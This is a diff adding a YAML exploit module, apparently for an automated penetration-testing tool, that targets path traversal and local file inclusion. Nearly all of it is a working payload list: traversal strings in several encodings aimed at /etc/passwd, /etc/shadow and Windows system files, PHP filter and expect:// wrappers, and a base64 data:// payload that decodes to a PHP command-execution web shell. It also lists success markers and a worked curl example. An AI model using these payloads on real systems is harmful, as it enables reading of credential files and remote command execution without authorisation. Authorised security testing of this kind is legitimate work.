@@ -1,0 +1,66 @@
+name: path_traversal
+description: Path traversal / Local File Inclusion
+phase: exploit
+priority: 8
+
+conditions:
+  triggers:
+    - Parameter file/path/dir di URL (/download?file=report.pdf)
+    - Include/require dengan parameter (/index.php?page=home)
+    - Template rendering with file selection (/template?name=default)
+    - Static file serving (/files/../../etc/passwd)
+  not_recommended:
+    - File path divalidasi: basename() + realpath() + prefix check
+    - Chroot jail atau restricted filesystem
+    - File service via database BLOB (bukan filesystem path)
+
+payloads:
+  basic:
+    - "../../../etc/passwd"
+    - "..\\..\\..\\windows\\win.ini"
+    - "../../../../etc/shadow"
+  encoded:
+    - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+    - "..%252f..%252f..%252fetc/passwd"  # double URL encode
+    - "....//....//....//etc/passwd"       # bypass filter ../
+  with_nullbyte:
+    - "../../../etc/passwd%00.png"
+    - "../../../etc/passwd%00"
+  php_wrappers:
+    - "php://filter/convert.base64-encode/resource=index.php"
+    - "php://filter/resource=/etc/passwd"
+    - "expect://id"
+    - "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg=="
+  windows:
+    - "C:\\Windows\\win.ini"
+    - "C:\\boot.ini"
+    - "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts"
+
+tools:
+  primary: manual (curl/httpx)
+  automated: [ffuf, wfuzz]
+  manual: [curl, httpx, python]
+
+validation:
+  method: deterministic
+  rules:
+    - type: file_content
+      markers:
+        - "root:x:0:0"  # /etc/passwd
+        - "[fonts]"      # win.ini
+        - "boot loader"  # boot.ini
+        - "<?php"        # PHP source code disclosure
+    - type: php_filter
+      method: "base64 decode response → readable PHP source"
+    - type: error_disclosure
+      method: "Warning: include(fake_path.php): failed to open stream"
+  reject_if:
+    - "Response 200 tapi isinya tidak seperti file target (halaman default)"
+    - "Hanya path yang direfleksikan (bukan konten file)"
+    - "Error include muncul tapi tidak bisa baca file lain"
+
+examples:
+  - target: "/download?file=report.pdf"
+    payload: "../../../etc/passwd"
+    indicator: "root:x:0:0:root:/root:/bin/bash"
+    tool: "curl"
